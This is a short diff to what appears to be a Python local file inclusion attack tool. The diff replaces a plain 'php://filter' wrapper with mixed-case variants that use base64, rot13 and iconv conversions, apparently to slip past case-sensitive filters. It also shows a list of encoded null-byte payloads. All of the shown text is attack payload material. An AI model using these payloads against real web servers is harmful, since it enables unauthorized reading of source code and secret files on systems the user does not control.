@@ -54,7 +54,9 @@ nullchars = ['%00', '%2500', '%25%30%30', '%u0000', '%c0%80', '%e0%80']
 
 lfi = False
 phase1_wrappers = [
-    "php://filter/convert.base64-encode/resource=",
+    "pHp://fiLTer/convert.base64-encode/resource=",
+    "pHP://fIltEr/read=string.rot13/resource=",
+    "PhP://FilTer/convert.iconv.utf-8.utf-16/resource=",
 ]
 
 wrapperCount = 4
